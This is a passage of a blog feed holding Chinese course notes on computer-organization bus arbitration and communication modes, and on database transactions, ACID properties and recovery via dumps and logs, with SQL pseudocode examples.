class="headerlink" title="4.3 总线结构举例"></a>4.3 总线结构举例</h2><h3 id="4-3-1-传统微型机总线结构"><a href="#4-3-1-传统微型机总线结构" class="headerlink" title="4.3.1 传统微型机总线结构"></a>4.3.1 传统微型机总线结构</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_MaGsclcoyj.png"></p><h3 id="4-3-2-VL-BUS局部总线结构"><a href="#4-3-2-VL-BUS局部总线结构" class="headerlink" title="4.3.2 VL-BUS局部总线结构"></a>4.3.2 VL-BUS局部总线结构</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_5MDLEiR_AO.png"></p><h3 id="4-3-3-PCI总线结构"><a href="#4-3-3-PCI总线结构" class="headerlink" title="4.3.3 PCI总线结构"></a>4.3.3 PCI总线结构</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_8EvnF0WPgx.png"></p><h3 id="4-3-4-多层-PCI-总线结构"><a href="#4-3-4-多层-PCI-总线结构" class="headerlink" title="4.3.4 多层 PCI 总线结构"></a>4.3.4 多层 PCI 总线结构</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_LXOOxgfJap.png"></p><hr><h1 id="5-总线控制"><a href="#5-总线控制" class="headerlink" title="5 总线控制"></a>5 总线控制</h1><p>总线上所连接的各类设备，按其对总线有无控制功能可分为主设备（模块）和从设备（模块）两种。<strong>主设备对总线有控制权，从设备只能响应从主设备发来的总线命令，对总线没有控制权。</strong></p><h2 id="5-1-总线判优控制"><a href="#5-1-总线判优控制" class="headerlink" title="5.1 总线判优控制"></a>5.1 总线判优控制</h2><p><strong>总线判优控制用来决定多个设备发出总线请求时，哪个设备具有总线使用权。</strong></p><p>总线判优控制可分<strong>集中式</strong>和<strong>分布式</strong>两种，前者将控制逻辑集中在一处（如在CPU中），后者将控制逻辑分散在与总线连接的各个部件或设备上。</p><p>常见的几种控制优先权的仲裁方式有三种： 链式查询、计数器定时查询和独立请求方式。</p><h3 id="5-1-1-链式查询"><a href="#5-1-1-链式查询" class="headerlink" title="5.1.1 链式查询"></a>5.1.1 链式查询</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_Dv1eZ6rpUG.png"></p><p>图中控制总线中有3根线用于总线控制（BS总线忙、BR总线请求和BG总线同意），其中总线同意信号BG是串行地从一个I&#x2F;0接口送到下一个l&#x2F;0接口。</p><p><strong>如果BG到达的接口有总线请求，BG信号就不再往下传，意味着该接口获得了总线使用权，并建立总线忙BS信号，表示它占用了总线。</strong></p><p>可见在链式查询中，<strong>离总线控制部件最近的设备具有最高的优先级。</strong></p><p>这种方式的特点是：只需很少几根线就能按一定优先次序实现总线控制，并且很容易扩充设备，但对电路故障很敏感，且优先级别低的设备可能很难获得请求。即：</p><ul><li>优点： 结构简单，需要的线少。容易扩充设备。</li><li>缺点： 对电路故障敏感，优先级低的设备获得总线请求的可能性低。</li></ul><h3 id="5-1-2-计数器定时查询"><a href="#5-1-2-计数器定时查询" class="headerlink" title="5.1.2 计数器定时查询"></a>5.1.2 计数器定时查询</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_zF2WrdZkXH.png"></p><p>多了一条设备地址线，少了总线同意BG线。</p><p>总线控制部件接到由BR送来的总线请求信号后，在总线未被使用（BS&#x3D;0）的情况下，总线控制部件中的计数器开始计数，并通过设备地址线向各设备发出一组地址信号。</p><p>当某个请求占用总线的设备地址与计数值一致时，便获得总线使用权，此时终止计数查询。</p><p>举例： 加入总线控制部件接收到总线请求信号后，计数器从0开始计时，此时I&#x2F;O接口从0到n编号，并按顺序排列。计数器数到1时，判断第1个设备是否发送了总线请求信号，是则I&#x2F;O接口设备获得总线使用权限，同时计数器停止计时。否则计时器继续往下数，直到找到发送请求的设备为止。</p><ul><li><strong>优点</strong>： I&#x2F;O设备的优先级控制非常灵活，可以通过设置计数器计数的初值进行设定。计数器可以从上一次计数的终止点开始计数，也可以每次置0，也可以设定某个值。</li><li><strong>缺点</strong>：增加了控制线（设备地址线）数，控制也较复杂。</li></ul><h3 id="5-1-3-独立请求方式"><a href="#5-1-3-独立请求方式" class="headerlink" title="5.1.3 独立请求方式"></a>5.1.3 独立请求方式</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_tUuUCUJ2tU.png"></p><p>独立请求方式就每个设备都有一条总线请求线BR和总线同意线BG。</p><p>优缺点非常明显，控制线数量多，总线控制非常复杂。但响应速度快，优先次序控制灵活。</p><blockquote><p>链式查询：使用2根线确定总线使用权属于哪个设备<br>计数器查询：大致使用logn 根线<br>独立请求：使用2n 根线</p></blockquote><h2 id="5-2-总线通信控制"><a href="#5-2-总线通信控制" class="headerlink" title="5.2 总线通信控制"></a>5.2 总线通信控制</h2><p>在主模块获得总线使用权后，主设备会和从设备进行信息交换，而总线通信控制的目的就是解决主模块和从模块双方协调配合的问题。</p><p>将完成一次总线操作的时间称为总线传输周期，分为以下4个阶段：</p><ol><li>申请分配阶段：主模块向上申请总线使用权，根据总线的判优逻辑获得总线使用权。</li><li>寻址阶段：主设备向从设备发出命令并给出地址。</li><li>传数阶段：主模块和从模块交换数据。</li><li>结束阶段：主模块和从模块撤销相关的信息。</li></ol><p>通常使用4种通信方式：同步通信、异步通信、半同步通信和分离式通信。</p><h3 id="5-2-1-同步通信"><a href="#5-2-1-同步通信" class="headerlink" title="5.2.1 同步通信"></a>5.2.1 同步通信</h3><p>同步通信，要有统一的定长的时钟标准来控制数据传送的过程，每一个操作、信号的给出都是在固定的时间点。</p><p>在同步通信中，模块间都用的统一的定长时钟标准，它们要在同样的时限完成规定的操作，主模块和从模块间是强制同步的，对多个速度不同的模块，必须要用最慢的那个模块来定下时钟标准，这就导致快的模块要按照慢的模块的标准来传输。</p><p>所以同步通信一般应用在总线长度较短，存取时间比较一致的情况下才使用同步通信。</p><h4 id="5-2-1-1-同步通信数据输入过程"><a href="#5-2-1-1-同步通信数据输入过程" class="headerlink" title="5.2.1.1 同步通信数据输入过程"></a>5.2.1.1 同步通信数据输入过程</h4><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_Ef72xKktd8.png"></p><ol><li>申请分配、寻址阶段：在传输周期开始之前，主模块必须要先获得总线的使用权，并且获得从模块的地址信号。</li><li>T1阶段：主模块发地址</li><li>T2阶段：主模块发出读命令</li><li>T3阶段：从模块提供数据</li><li>T4阶段：主模块撤销读命令，从模块撤销数据</li></ol><h4 id="5-2-1-2-同步通信数据输出过程"><a href="#5-2-1-2-同步通信数据输出过程" class="headerlink" title="5.2.1.2 同步通信数据输出过程"></a>5.2.1.2 同步通信数据输出过程</h4><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_G9LJjkovRb.png"></p><ol><li>T1阶段：主模块发地址</li><li>T1.5阶段：主模块提供要写入的数据</li><li>T2阶段：主模块发出写命令，从模块写入数据</li><li>T4阶段：主模块撤销读命令和数据等信号</li></ol><p>同步通信的优点：</p><ol><li>规定明确、统一，模块间的配合简单一致</li></ol><p>缺点：</p><ol><li>主、从模块时间配合属于强制性“同步”，必须在限定时间内完成规定的要求</li><li>严重影响总线的工作效率，缺乏灵活性</li></ol><h3 id="5-2-2-异步通信"><a href="#5-2-2-异步通信" class="headerlink" title="5.2.2 异步通信"></a>5.2.2 异步通信</h3><p>和同步通信相反，异步通信没有统一的时钟标准，采用的是应答的方式。 &#x20;</p><p>在异步通信时，主设备发起请求，从设备受主设备的控制。 &#x20;</p><p>和同步相比，没有定长的时钟，但是要增加一条请求线和一条应答线，请求线用于主设备向从设备发送请求信号，应答线用于从设备向主设备发送应答信号。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_fTb7iruJAb.png"></p><h4 id="5-2-2-1-不互锁"><a href="#5-2-2-1-不互锁" class="headerlink" title="5.2.2.1 不互锁"></a>5.2.2.1 不互锁</h4><p>主设备向从设备发送请求信号，从设备收到请求后作出应答，主设备不管从设备有没有应答，一段时间过后主设备会撤销请求，从设备也不管主设备有没有接收到应答信号，一段时间后也会撤销应答。</p><p>例如，CPU向主存写信息，就是采用这种方式。</p><h4 id="5-2-2-2-半互锁"><a href="#5-2-2-2-半互锁" class="headerlink" title="5.2.2.2 半互锁"></a>5.2.2.2 半互锁</h4><p>主设备向从设备发送请求信号，从设备收到请求后发出应答信号，主设备只有在收到应答信号后才会撤销请求，如果没有收到应答信号，<strong>它的请求信号会一直保持。</strong></p><p>例如，在多机系统中，某个CPU要访问共享存储器时，该CPU发出访存命令后，必须收到存储器未被占用的回答信号，才能真正进行访存操作。</p><h4 id="5-2-2-3-全互锁"><a href="#5-2-2-3-全互锁" class="headerlink" title="5.2.2.3 全互锁"></a>5.2.2.3 全互锁</h4><p>主设备向从设备发送请求信号，从设备收到请求后发出应答信号，主设备只有在收到应答信号后才会撤销请求，从设备只有在主设备撤销请求后才会撤销应答。 &#x20;</p><p>这种方式可以完成可靠的通信传输。例如，在网络通信中使用的就是全互锁方式。</p><ul><li><strong>波特率</strong>：单位时间内传送二进制数据的位数，单位是bps（位&#x2F;秒），记作波特。</li><li><strong>比特率</strong>：单位时间内传送二进制有效数据的位数，单位用bps表示。</li></ul><h3 id="5-2-3-半同步通信"><a href="#5-2-3-半同步通信" class="headerlink" title="5.2.3 半同步通信"></a>5.2.3 半同步通信</h3><p>半同步通信是同步通信和异步通信的结合，主要解决的是不同速度的两个模块之间进行通信的问题。 &#x20;</p><ul><li>同步通信发送方用系统时钟前沿发信号，接收方用系统时间后沿判断识别。 &#x20;</li><li>异步通信允许不同素的的模块和谐工作。 &#x20;</li></ul><p>半同步为了完成这两个要求，增加一条等待相应信号，这条等待信号由从设备给出。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF/image_cE7_tJdxgo.png"></p><ol><li>T1时钟前，主模块给从模块发送地址信息</li><li>T2时，主模块发送读命令</li><li>在T3时钟前，如果从设备不能准备好数据，wait信号有效，在T2时钟和T3时钟之间插入一个Tw周期，在T3开始前发送数据信号</li><li>wait信号结束，数据准备完成</li><li>T3周期从模块提供数据</li><li>T4周期读命令和数据命令撤销</li></ol><p>半同步通信适用于系统工作速度不高但又包含了由许多工作速度差异较大的各类设备组成的简单系统。</p><p>缺点是对系统时钟频率不能要求太高，从整体看，系统工作的速度还不是很高。</p><h3 id="5-2-4-分离式通信"><a href="#5-2-4-分离式通信" class="headerlink" title="5.2.4 分离式通信"></a>5.2.4 分离式通信</h3><p>分离式通信充分挖掘总线每个瞬间的潜力，让总线发挥最大的效能。 &#x20;</p><p>一个总线传输周期可分为以下三个子周期（以输入数据为例）： &#x20;</p><ol><li>主模块发地址、命令 （占用总线） &#x20;</li><li>从模块准备数据 （不占用总线，且时间一般很长） &#x20;</li><li>从模块向主模块发数据 （占用总线）</li></ol><p>分离式通信为什么能充分挖掘系统总线的潜力？主要是因为分离式传输把一个总线传输周期分成了两个子周期；</p><ol><li><p>子周期1：主模块申请占用总线，使用完后马上放弃总线的使用权；</p></li><li><p>子周期2：从模块申请占用总线，将各种信息送至总线上；此时的从模块实际上变成了主模块，因为是当前的模块发起的总线请求。</p></li></ol><p>子周期1完成地址、命令的传达后，立马放弃总线的使用权，从模块收到请求后准备数据，此时总线是空闲的，可以处理其他的总线判优操作，如其他传输的子周期1或子周期2；</p><p>如果不分子周期，一个传输周期一直占用总线，在从模块准备数据时总线是空闲的，但周期未结束，总线无法处理其他请求。</p><p>所以分离式通信可以充分挖掘总线的潜力，提高系统总线的利用率。</p><p>分离式通信的特点： &#x20;</p><ol><li><p>各模块有权申请占用总线 &#x20;</p></li><li><p>采用同步方式通信，不等对方回答 &#x20;</p></li><li><p>各模块准备数据时，不占用总线 &#x20;</p></li><li><p>总线被占用时无空闲</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库第10章：数据库恢复技术</title>
      <link href="/2024/06/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%81%A2%E5%A4%8D%E6%8A%80%E6%9C%AF/"/>
      <url>/2024/06/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%81%A2%E5%A4%8D%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/06/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%81%A2%E5%A4%8D%E6%8A%80%E6%9C%AF/image_eBoBfo1D03.png"></p><h1 id="1-事务的基本概念"><a href="#1-事务的基本概念" class="headerlink" title="1 事务的基本概念"></a>1 事务的基本概念</h1><h2 id="1-1-事务定义"><a href="#1-1-事务定义" class="headerlink" title="1.1 事务定义"></a>1.1 事务定义</h2><p>事务：是用户定义的一个数据库操作序列，这些操作要么全做，要么全不做，一个不可分割的工作单位。</p><p>事务和程序比较：</p><ol><li>在关系数据库中，一个事务可以是一条或多条SQL语句，也可以包含一个或多个程序</li><li>一个程序通常包含多个事务</li></ol><h2 id="1-2-定义事务"><a href="#1-2-定义事务" class="headerlink" title="1.2 定义事务"></a>1.2 定义事务</h2><h3 id="1-2-1-显式定义方式"><a href="#1-2-1-显式定义方式" class="headerlink" title="1.2.1 显式定义方式"></a>1.2.1 显式定义方式</h3><ul><li>COMMIT：表示提交，即提交事务的所有操作</li><li>ROLLBACK：表示回滚，将事务中对数据库的所有已完成的操作全部撤销，回滚到事务开始时的状态</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span> TRANSACTION                   <span class="keyword">BEGIN</span> TRANSACTION</span><br><span class="line">    <span class="keyword">SQL</span> 语句<span class="number">1</span>                          <span class="keyword">SQL</span> 语句<span class="number">1</span></span><br><span class="line">    <span class="keyword">SQL</span> 语句<span class="number">2</span>                          <span class="keyword">SQL</span> 语句<span class="number">2</span></span><br><span class="line">    。。。。。                          。。。。。</span><br><span class="line"><span class="keyword">COMMIT</span>                              <span class="keyword">ROLLBACK</span></span><br></pre></td></tr></table></figure><h3 id="1-2-2-隐式方式-xD"><a href="#1-2-2-隐式方式-xD" class="headerlink" title="1.2.2 隐式方式&#xD;"></a>1.2.2 隐式方式&#xD;</h3><p>当用户没有显式地定义事务时，DBMS按缺省规定自动划分事务。</p><h2 id="1-3-事务的ACID特性"><a href="#1-3-事务的ACID特性" class="headerlink" title="1.3 事务的ACID特性"></a>1.3 事务的ACID特性</h2><ol><li><strong>原子性</strong>（Atomicity）：逻辑工作单位， 事务中包括的诸操作要么都做，要么都不做</li><li><strong>一致性</strong>（Consistency）：从一个一致性状态到另一个一致性状态</li><li><strong>隔离性</strong>（Isolation）：事务之间不能互相干扰，即一个事务的内部操作及使用的数据对其他并发事务是隔离的，并发执行的各个事务之间不能互相干扰</li><li><strong>持续性</strong>（Durability ）：改变是永久的，一个事务一旦提交，它对数据库中数据的改变就应该是永久性的，接下来的其他操作或故障不应该对其执行结果有任何影响</li></ol><p>事务ACID特性可能遭到破坏的因素有：</p><ol><li>多个事务并行运行时，不同事务的操作交叉执行。</li><li>事务在运行过程中被强行停止。</li></ol><hr><h1 id="2-数据库恢复概述"><a href="#2-数据库恢复概述" class="headerlink" title="2 数据库恢复概述"></a>2 数据库恢复概述</h1><p>计算机软、硬件故障等系统故障和操作员的失误、恶意的破坏等人为故障是不可避免的。把数据库从错误状态恢复到某一已知的正确状态（亦称为一致状态或完整状态），这就是数据库的恢复。</p><p>恢复子系统是数据库管理系统的一个重要组成部分，而且还相当庞大，通常占整个系统代码的10%以上。</p><hr><h1 id="3-故障的种类"><a href="#3-故障的种类" class="headerlink" title="3 故障的种类"></a>3 故障的种类</h1><h2 id="3-1-事务内部的故障"><a href="#3-1-事务内部的故障" class="headerlink" title="3.1 事务内部的故障"></a>3.1 事务内部的故障</h2><p>有的是可以通过事务程序本身发现的（见下面转账事务的例子），有的是非预期的，不能由事务程序处理。</p><blockquote><p>例如，银行转账事务，这个事务把一笔金额从一个账户甲转给另一个账户乙。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span> TRANSACTION</span><br><span class="line"> 读账户甲的余额BALANCE;</span><br><span class="line"> BALANCE <span class="operator">=</span> BALANCE <span class="operator">-</span> AMOUNT;  # (AMOUNT为转账金额)</span><br><span class="line"> 写回BALANCE;</span><br><span class="line"> IF (BALANCE <span class="operator">&lt;</span> <span class="number">0</span>) <span class="keyword">THEN</span></span><br><span class="line"> &#123;</span><br><span class="line">      打印<span class="string">&#x27;金额不足，不能转账&#x27;</span>；</span><br><span class="line">      <span class="keyword">ROLLBACK</span>； # (撤销刚才的修改，恢复事务)</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">ELSE</span></span><br><span class="line"> &#123;</span><br><span class="line">      读账户乙的余额BALANCE1；</span><br><span class="line">      BALANCE1 <span class="operator">=</span> BALANCE1 <span class="operator">+</span> AMOUNT；</span><br><span class="line">      写回BALANCE1；</span><br><span class="line">      <span class="keyword">COMMIT</span>；</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这个例子所包括的两个更新操作要么全部完成要么全部不做。否则就会使数据库处于不一致状态，例如只把账户甲的余额减少了而没有把账户乙的余额增加。</p><p>在这段程序中若产生账户甲余额不足的情况，应用程序可以发现并让事务滚回，撤销已作的修改，恢复数据库到正确状态。</p><p>事务内部更多的故障是非预期的，是不能由应用程序处理的。例如：</p><ol><li>运算溢出</li><li>并发事务发生死锁而被选中撤销该事务</li><li>违反了某些完整性限制等</li></ol><p>以后，事务故障仅指这类<strong>非预期的故障</strong>。事务故障意味着事务没有达到预期的终点，因此数据库可能处于不正确的状态。</p><p>事务故障的恢复：<strong>撤消事务（UNDO）</strong>。</p><h2 id="3-2-系统故障"><a href="#3-2-系统故障" class="headerlink" title="3.2 系统故障"></a>3.2 系统故障</h2><p>系统故障称为软故障，是指造成系统停止运转的任何事件，使得系统要重新启动。整个系统的正常运行突然被破坏，所有正在运行的事务都非正常终止。</p><p>系统故障的常见原因：</p><ol><li>特定类型的硬件错误（如CPU故障）</li><li>操作系统故障</li><li>DBMS代码错误</li><li>系统断电</li></ol><p>虽然不破坏数据库，但是内存中数据库缓冲区的信息全部丢失，一些尚未完成的事务的结果可能已送入物理数据库，从而数据库可能处于不正确的状态。</p><p>若发生系统故障时，事务未提交：</p><ul><li>恢复策略：<strong>强行撤消</strong>（UNDO）所有未完成事务</li></ul><p>发生系统故障时，事务已提交，但缓冲区中的信息尚未完全写回到磁盘上：</p><ul><li>复策略：<strong>重做</strong>（REDO）所有已提交的事务</li></ul><h2 id="3-3-介质故障"><a href="#3-3-介质故障" class="headerlink" title="3.3 介质故障"></a>3.3 介质故障</h2><p>介质故障称为硬故障，指外存故障，如磁盘损坏、磁头碰撞、操作系统的某种潜在错误<br>以及瞬时强磁场干扰等。</p><p>这类故障将破坏数据库或部分数据库，并影响正在存取这部分数据的所有事务。这类故障比前两种故障发生的可能性小得多，但破坏性最大。</p><p>介质故障的恢复</p><ol><li>装入数据库发生介质故障前某个时刻的数据副本</li><li>重做自此时始的所有成功事务，将这些事务已提交的结果重新记入数据库</li></ol><h2 id="3-4-计算机病毒"><a href="#3-4-计算机病毒" class="headerlink" title="3.4 计算机病毒"></a>3.4 计算机病毒</h2><p>计算机病毒是一种人为的故障或破坏，是一些恶作剧者研制的一种计算机程序，可以繁殖和传播。</p><p>有的计算机病毒传播很快，一旦侵入系统就马上摧毁系统；有的病毒有较长的潜伏期，计算机在感染后数天或数月才开始发病，会破坏、盗窃系统中的数据，破坏系统文件。</p><h2 id="3-5-故障总结"><a href="#3-5-故障总结" class="headerlink" title="3.5 故障总结"></a>3.5 故障总结</h2><p>各类故障，对数据库的影响有两种可能性</p><ol><li>一是数据库本身被破坏</li><li>二是数据库没有被破坏，但数据可能不正确，这是由于事务的运行被非正常终止造成的。</li></ol><p>数据库中任何一部分被破坏或不正确的数据可以根据存储在系统别处的冗余数据来重建，虽然恢复的基本原理很简单，但是实现技术的细节却相当复杂。</p><hr><h1 id="4-恢复的实现技术"><a href="#4-恢复的实现技术" class="headerlink" title="4 恢复的实现技术"></a>4 恢复的实现技术</h1><p>恢复操作的基本原理：冗余，即利用存储在系统其它地方的冗余数据来重建数据库中已被破坏或不正确的那部分数据。</p><p>恢复机制涉及的关键问题是如何建立冗余数据（数据转储和登录日志文件），以及如何利用这些冗余数据实施数据库恢复。</p><h2 id="4-1-数据转储"><a href="#4-1-数据转储" class="headerlink" title="4.1 数据转储"></a>4.1 数据转储</h2><p>转储是指DBA将整个数据库复制到磁带或另一个磁盘上保存起来的过程，备用的数据称为后备副本或后援副本</p><p>数据库遭到破坏后可以将后备副本重新装入，重装后备副本只能将数据库恢复到转储时的状态。要想恢复到故障发生时的状态，必须重新运行自转储以后的所有更新事务。</p><p><img src="/2024/06/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%81%A2%E5%A4%8D%E6%8A%80%E6%9C%AF/image_Chg_PpvfK8.png"></p><h3 id="4-1-1-静态转储与动态转储"><a href="#4-1-1-静态转储与动态转储" class="headerlink" title="4.1.1 静态转储与动态转储"></a>4.1.1 静态转储与动态转储</h3><p>静态转储是在系统中无运行事务时进行的转储操作，即转储开始时数据库处于一致性状态，而转储期间不允许对数据库的任何存取、修改活动，得到的一定是一个数据一致性的副本 。</p><p><strong>优点</strong>：实现简单</p><p><strong>缺点</strong>：转储必须等待正运行的用户事务结束 ，新的事务必须等转储结束，降低了数据库的可用性。</p><p>动态转储是指转储期间允许对数据库进行存取或修改。即转储操作与用户事务并发进行。</p><p>优点：</p><ol><li>不用等待正在运行的用户事务结束</li><li>不会影响新事务的运行</li></ol><p>缺点：</p><ol><li>不能保证副本中的数据正确有效</li></ol><blockquote><p>在转储期间的某个时刻Tc，系统把数据A&#x3D;100转储到磁带上，而在下一时刻Td，某一事务将A改为200。转储结束后，后备副本上的A已是过时的数据了</p></blockquote><p>因此需要把动态转储期间各事务对数据库的修改活动登记下来，建立日志文件。后备副本加上日志文件才能把数据库恢复到某一时刻的正确状态。</p><h3 id="4-1-2-海量转储与增量转储-xD"><a href="#4-1-2-海量转储与增量转储-xD" class="headerlink" title="4.1.2 海量转储与增量转储&#xD;"></a>4.1.2 海量转储与增量转储&#xD;</h3><ul><li>海量转储: 每次转储全部数据库</li><li>增量转储: 只转储上次转储后更新过的数据</li></ul><p>海量转储与增量转储比较：</p><ul><li><p>从恢复角度看，使用海量转储得到的后备副本进行恢复往往更方便</p></li><li><p>但如果数据库很大，事务处理又十分频繁，则增量转储方式更实用更有效</p></li></ul><h3 id="4-1-3-转储方法分类-xD"><a href="#4-1-3-转储方法分类-xD" class="headerlink" title="4.1.3 转储方法分类&#xD;"></a>4.1.3 转储方法分类&#xD;</h3><p><img src="/2024/06/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%81%A2%E5%A4%8D%E6%8A%80%E6%9C%AF/image_RcNAErm4jW.png"></p><h2 id="4-2-登记日志文件"><a href="#4-2-登记日志文件" class="headerlink" title="4.2 登记日志文件"></a>4.2 登记日志文件</h2><h3 id="4-2-1-日志文件的格式和内容"><a href="#4-2-1-日志文件的格式和内容" class="headerlink" title="4.2.1 日志文件的格式和内容"></a>4.2.1 日志文件的格式和内容</h3><p>日志文件（log）是用来记录事务对数据库的更新操作的文件，不同的数据库系统使用的日志文件格式并不完全一样，主要有两种：</p><ol><li>以记录为单位的日志文件</li><li>以数据块为单位的日志文件</li></ol><h3 id="4-2-2-以记录为单位的日志文件"><a href="#4-2-2-以记录为单位的日志文件" class="headerlink" title="4.2.2 以记录为单位的日志文件"></a>4.2.2 以记录为单位的日志文件</h3><p>日志文件中需要登记的内容包括：</p><ul><li>各个事务的开始标记(BEGIN TRANSACTION)</li><li>各个事务的结束标记(COMMIT或ROLLBACK)</li><li>各个事务的所有更新操作</li></ul><p>以上均作为日志文件中的一个日志记录 (log  record)</p><p>每条日志记录的内容：</p><ul><li>事务标识（标明是哪个事务）&#x20;</li><li>操作类型（插入、删除或修改）</li><li>操作对象（记录内部标识）</li><li>更新前数据的旧值（对插入操作而言，此项为空值）</li><li>更新后数据的新值（对删除操作而言, 此项为空值）</li></ul><h3 id="4-2-3-以数据块为单位的日志文件"><a href="#4-2-3-以数据块为单位的日志文件" class="headerlink" title="4.2.3 以数据块为单位的日志文件"></a>4.2.3 以数据块为单位的日志文件</h3><p>每条日志记录的内容：</p><ul><li><p>事务标识（标明是那个事务）</p></li><li><p>被更新的数据块</p></li></ul><p>由于将更新前的整个块和更新后的整个块都放入日志文件中，操作类型和操作对象等信息就不必放入日志记录中了。</p><h3 id="4-2-4-日志文件的作用"><a href="#4-2-4-日志文件的作用" class="headerlink" title="4.2.4 日志文件的作用"></a>4.2.4 日志文件的作用</h3><ol><li>进行事务故障恢复和系统故障恢复</li><li>在动态转储方式中必须建立日志文件，后备副本和日志文件结合起来才能有效地恢复数据库</li><li>协助后备副本进行介质故障恢复</li></ol><blockquote><p>利用静态转储副本和日志文件进行恢复</p></blockquote><p><img src="/2024/06/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%81%A2%E5%A4%8D%E6%8A%80%E6%9C%AF/image_cRG-MrlBhx.png"></p><ul><li>系统在Ta时刻停止运行事务，进行数据库转储</li><li>在Tb时刻转储完毕，得到Tb时刻的数据库一致性副本</li><li>系统运行到Tf时刻发生故障</li><li>为恢复数据库，首先由DBA重装数据库后备副本，将数据库恢复至Tb时刻的状态重新运行自Tb～Tf时刻的所有更新事务，把数据库恢复到故障发生前的一致状态</li></ul><h3 id="4-2-5-登记日志文件-xD"><a href="#4-2-5-登记日志文件-xD" class="headerlink" title="4.2.5 登记日志文件&#xD;"></a>4.2.5 